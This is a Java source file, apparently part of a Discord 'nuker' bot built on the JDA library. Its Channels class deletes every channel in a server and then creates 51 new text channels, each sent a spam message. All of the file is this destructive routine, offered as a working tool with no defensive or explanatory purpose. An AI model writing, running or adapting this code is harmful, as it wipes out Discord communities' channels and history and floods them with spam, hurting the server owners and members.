package com.cooleg.bot.Parts;

import com.cooleg.bot.Bot;
import net.dv8tion.jda.api.entities.*;

import java.util.List;

public class Channels {

    private Guild guild;

    public Channels(Guild guild) throws InterruptedException {
//        if (!Bot.nukechannels) {return;}
        this.guild = guild;

        bombChannels();
        spamChannels();

    }

    public void bombChannels() throws InterruptedException {
        List<GuildChannel> channelList = guild.getChannels();
        System.out.println("Killin the channels out");
        for (Channel channel : channelList) {
            System.out.println("Channel: " + channel.getName() + " was deleted");
            channel.delete().queue();
            Thread.sleep(30);

        }
        return;
    }

    public void spamChannels() throws InterruptedException {
        System.out.println("Spamming channels...");
        for (int i=0; i<=50; i++) {
            try {
               TextChannel channel = guild.createTextChannel(Bot.channelnames).complete();
               channel.sendMessage(Bot.message).queue();
            } catch (Exception e) {
                System.out.println("Well smthn broke witht the channel spammer");
            }
            Thread.sleep(30);
        }
        System.out.println("Done with the channels...");
        return;
    }

}
